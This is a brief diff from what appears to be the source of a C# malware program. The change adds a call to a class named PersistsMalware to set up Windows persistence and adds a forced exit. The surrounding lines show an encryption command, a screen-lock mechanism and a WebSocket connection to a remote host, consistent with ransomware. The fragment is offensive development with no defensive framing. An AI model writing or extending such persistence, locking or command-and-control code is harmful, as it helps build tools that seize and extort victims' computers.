@@ -15,8 +15,11 @@ encrypt.ExecuteCommand("");
 
 
 
-
+PersistsMalware.CreatePersistenceWindows();
 LockMechanismUtil.StartLockMechanism();
 ExcelPackage.LicenseContext = LicenseContext.NonCommercial;
 WebSocketClient.ConnectToHost();
+
+
+Environment.Exit(0);
 
